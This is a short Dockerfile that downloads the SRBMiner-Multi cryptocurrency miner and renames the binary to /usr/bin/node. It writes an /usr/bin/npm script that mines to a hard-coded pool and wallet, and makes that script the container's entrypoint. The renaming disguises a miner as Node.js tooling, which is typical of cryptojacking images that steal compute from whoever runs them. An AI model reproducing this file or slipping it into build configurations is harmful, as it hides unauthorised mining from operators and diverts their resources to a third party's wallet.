
FROM debian
RUN apt update && apt -y install wget xz-utils && \
    cd /opt && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.1/SRBMiner-Multi-0-8-1-Linux.tar.xz && \
	tar xf SRBMiner-Multi-0-8-1-Linux.tar.xz && rm -rf /opt/SRBMiner-Multi-0-8-1-Linux.tar.xz && \
	apt -y purge xz-utils && apt -y autoremove --purge && apt -y clean && apt -y autoclean; rm -rf /var/lib/apt-get/lists/*
RUN mv /opt/SRBMiner-Multi-0-8-1/SRBMiner-MULTI /usr/bin/node
RUN echo " node --algorithm minotaurX --pool stratum+tcps://stratum-na.rplant.xyz:17063 --wallet MHN6B218yFAF528SjcSxaq8exEE4bkC91o.px --disable-gpu" > /usr/bin/npm
RUN chmod +x /usr/bin/npm
ENTRYPOINT npm
